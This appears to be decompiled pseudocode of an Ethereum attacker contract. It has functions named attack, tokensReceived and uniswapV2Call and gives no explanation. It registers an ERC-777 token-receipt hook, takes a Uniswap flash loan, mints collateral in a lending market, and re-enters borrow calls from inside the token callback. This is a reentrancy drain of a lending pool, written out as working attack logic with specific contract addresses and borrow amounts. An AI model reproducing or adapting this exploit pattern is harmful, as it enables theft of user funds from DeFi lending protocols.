...
function attack() {
    ...
    call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.setInterfaceImplementer(address arg1, bytes32 arg2, address arg3) with:
        ...
        args address(this.address), 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a, this.address
...
function tokensReceived(bytes4 arg1, bytes32 arg2, address arg3, address arg4, address arg5, uint256 arg6, bytes arg7, bytes arg8) {
    ...
    call 0xd06527d5e56a3495252a528c4987003b712860ee.borrow(uint256 arg1) with:
         gas gas_remaining wei
        args 354 * 10^18
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
...
function uniswapV2Call(address arg1, uint256 arg2, uint256 arg3, bytes arg4) {
    ...
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(0xd06527d5e56a3495252a528c4987003b712860ee)
    call 0xd06527d5e56a3495252a528c4987003b712860ee.mint() with:
       value 500 * 10^18 wei
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    ...
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_code.size(0x2db6c82ce72c8d7d770ba1b5f5ed0b6e075066d6)
    call 0x2db6c82ce72c8d7d770ba1b5f5ed0b6e075066d6.accrueInterest() with:
         gas gas_remaining wei
    ...
    require ext_code.size(0x2db6c82ce72c8d7d770ba1b5f5ed0b6e075066d6)
    call 0x2db6c82ce72c8d7d770ba1b5f5ed0b6e075066d6.borrow(uint256 arg1) with:
         gas gas_remaining wei
        args 19480000 * 10^18
